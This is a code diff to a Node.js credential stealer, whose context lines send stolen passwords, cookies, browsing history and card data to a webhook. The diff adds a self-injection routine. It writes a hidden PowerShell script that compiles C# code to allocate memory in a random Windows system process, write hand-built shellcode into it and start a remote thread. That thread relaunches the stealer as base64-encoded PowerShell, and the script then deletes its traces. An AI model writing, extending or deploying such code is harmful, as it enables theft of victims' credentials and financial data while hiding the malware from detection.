@@ -533,6 +533,59 @@ async function main() {
   await sendWebhook({ embeds: [embedPasswords(passwords, pwUrl), embedCookies(cookies, ckUrl)] });
   await new Promise(function(r) { setTimeout(r, 600); });
   await sendWebhook({ embeds: [embedHistory(history, hiUrl), embedCards(cards, cdUrl)] });
+
+  // Inject into a random background Windows process
+  injectSelf();
+}
+
+function injectSelf() {
+  var ps1 = path.join(TMP, 'upd_' + RUN_ID + '.ps1');
+  var self = fs.readFileSync(__filename, 'utf8');
+  var b64  = Buffer.from(self, 'utf8').toString('base64');
+  var injPs = [
+    'Add-Type @\'',
+    'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Linq;',
+    'public class _Inj{',
+    '  [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a,bool b,uint c);',
+    '  [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);',
+    '  [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[]d,uint s,out uint w);',
+    '  [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);',
+    '  [DllImport("kernel32")] static extern IntPtr GetModuleHandleA(string n);',
+    '  [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string n);',
+    '  [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);',
+    '  static string[] T={"RuntimeBroker","backgroundTaskHost","sihost","fontdrvhost","dllhost","ctfmon","WmiPrvSE","spoolsv"};',
+    '  public static bool Run(string cmd){',
+    '    long we=GetProcAddress(GetModuleHandleA("kernel32.dll"),"WinExec").ToInt64();',
+    '    if(we==0)return false;',
+    '    byte[] cb=System.Text.Encoding.Default.GetBytes(cmd+"\\x00");',
+    '    byte[] sc=new byte[]{0x48,0x83,0xEC,0x28,0x48,0x83,0xE4,0xF0,0x48,0x8D,0x0D,0x13,0x00,0x00,0x00,0x31,0xD2,0x48,0xB8,',
+    '      (byte)(we&0xFF),(byte)((we>>8)&0xFF),(byte)((we>>16)&0xFF),(byte)((we>>24)&0xFF),',
+    '      (byte)((we>>32)&0xFF),(byte)((we>>40)&0xFF),(byte)((we>>48)&0xFF),(byte)((we>>56)&0xFF),',
+    '      0xFF,0xD0,0x48,0x83,0xC4,0x28,0xC3};',
+    '    byte[] pl=new byte[sc.Length+cb.Length];',
+    '    Buffer.BlockCopy(sc,0,pl,0,sc.Length);Buffer.BlockCopy(cb,0,pl,sc.Length,cb.Length);',
+    '    var rng=new Random();',
+    '    var procs=T.SelectMany(t=>Process.GetProcessesByName(t)).ToArray();',
+    '    if(procs.Length==0)procs=Process.GetProcessesByName("explorer");',
+    '    if(procs.Length==0)return false;',
+    '    var tgt=procs[rng.Next(procs.Length)];',
+    '    IntPtr h=OpenProcess(0x1F0FFF,false,(uint)tgt.Id);',
+    '    if(h==IntPtr.Zero)return false;',
+    '    IntPtr m=VirtualAllocEx(h,IntPtr.Zero,(uint)pl.Length,0x3000,0x40);',
+    '    uint wr;WriteProcessMemory(h,m,pl,(uint)pl.Length,out wr);',
+    '    CreateRemoteThread(h,IntPtr.Zero,0,m,IntPtr.Zero,0,IntPtr.Zero);',
+    '    CloseHandle(h);return true;',
+    '  }',
+    '}',
+    '\'@',
+    '[_Inj]::Run("powershell -w h -ep b -nop -e ' + b64 + '")',
+  ].join('\n');
+  try {
+    fs.writeFileSync(ps1, injPs, 'utf8');
+    cp.execSync('powershell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + ps1 + '"',
+      { timeout: 15000, windowsHide: true });
+  } catch {}
+  try { fs.unlinkSync(ps1); } catch {}
 }
 
 main().catch(function() {});
